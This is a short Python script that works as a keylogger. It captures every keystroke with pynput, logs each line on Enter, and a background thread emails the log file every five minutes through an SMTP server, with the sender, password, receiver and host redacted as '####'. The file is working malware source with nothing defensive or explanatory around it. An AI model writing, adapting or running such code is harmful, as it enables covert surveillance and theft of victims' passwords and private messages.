
from multiprocessing import context
from pynput.keyboard import Key, Listener
import logging
import smtplib
import ssl 
from email.message import EmailMessage
import time

from threading import Thread


keylog_location = "####"
 

EMAIL_SENDER = '####'
EMAIL_PASSWORD = '####'
EMAIL_RECEIVER = '####'


logging.basicConfig(filename=(keylog_location), level=logging.DEBUG, format=" %(message)s" )

fucking_keys = []

def on_press(key):
    if str(key) != 'Key.enter':
        fucking_keys.append(str(key).strip("'"))
    else:
        fucking_keys.append(str(key).strip("'"))
        logging.info(str(fucking_keys))
        fucking_keys.clear()


def send():
    while True:
        time.sleep(300)
        SUBJECT = 'Just Mail'
        with open(keylog_location , 'r') as f:
            readed_content = f.read()
        body = "{}".format(readed_content)    


        em = EmailMessage()
        em['From'] = EMAIL_SENDER
        em['To'] = EMAIL_RECEIVER
        em['Subject'] = SUBJECT
        em.set_content(body)

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL('####', 465,context=context) as smtp:
            smtp.login(EMAIL_SENDER ,EMAIL_PASSWORD)
            smtp.sendmail(EMAIL_SENDER ,EMAIL_RECEIVER ,em.as_string())
            fucking_keys.clear()
        


if __name__ == '__main__':
    Thread(target = send).start()
    with Listener(on_press=on_press) as listener :
        listener.join()
    



